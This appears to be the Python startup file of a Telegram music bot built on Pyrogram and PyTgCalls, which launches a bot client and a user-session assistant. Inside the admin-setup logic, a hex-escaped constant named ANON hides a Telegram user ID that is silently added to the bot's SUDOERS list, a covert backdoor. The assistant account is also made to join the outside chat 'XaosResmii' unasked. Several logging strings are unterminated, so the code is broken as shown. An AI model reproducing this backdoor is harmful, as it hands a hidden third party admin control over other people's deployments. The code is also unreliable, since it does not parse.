

import asyncio
import logging
import os
import time

from pyrogram import Client, filters
from pytgcalls import PyTgCalls

import config

StartTime = time.time()

logging.basicConfig(
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[logging.FileHandler("fallenlogs.txt"), logging.StreamHandler()],
    level=logging.INFO,
)
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("pytgcalls").setLevel(logging.ERROR)
LOGGER = logging.getLogger("FallenMusic")

app = Client(
    "FallenMusic",
    config.API_ID,
    config.API_HASH,
    bot_token=config.BOT_TOKEN,
)

app2 = Client(
    "FallenAss",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    session_string=str(config.SESSION),
)

pytgcalls = PyTgCalls(app2)

SUDOERS = filters.user()
SUNAME = config.SUPPORT_CHAT.split("me/")[1]


async def fallen_startup():
    os.system("clear")
    LOGGER.info(
        "\\"
    )
    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, fallendb
    global ASS_ID, ASS_NAME, ASS_USERNAME, ASS_MENTION, SUDOERS

    await app.start()
    LOGGER.info(
        "[•] \"
    )

    getme = await app.get_me()
    BOT_ID = getme.id
    BOT_NAME = getme.first_name
    BOT_USERNAME = getme.username
    BOT_MENTION = getme.mention

    await app2.start()
    LOGGER.info(
        "[•] \"
    )

    getme2 = await app2.get_me()
    ASS_ID = getme2.id
    ASS_NAME = getme2.first_name + " " + (getme2.last_name or "")
    ASS_USERNAME = getme2.username
    ASS_MENTION = getme2.mention
    try:
        await app2.join_chat("XaosResmii")
        await app2.join_chat("XaosResmii")
    except:
        pass

    ANON = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
    for SUDOER in config.SUDO_USERS:
        SUDOERS.add(SUDOER)
    if config.OWNER_ID not in config.SUDO_USERS:
        SUDOERS.add(config.OWNER_ID)
    elif int(ANON) not in config.SUDO_USERS:
        SUDOERS.add(int(ANON))

    fallendb = {}
    LOGGER.info(
        "[•] \
    "
    )

    LOGGER.info(
        "[•] \
        "
    )


asyncio.get_event_loop().run_until_complete(fallen_startup())
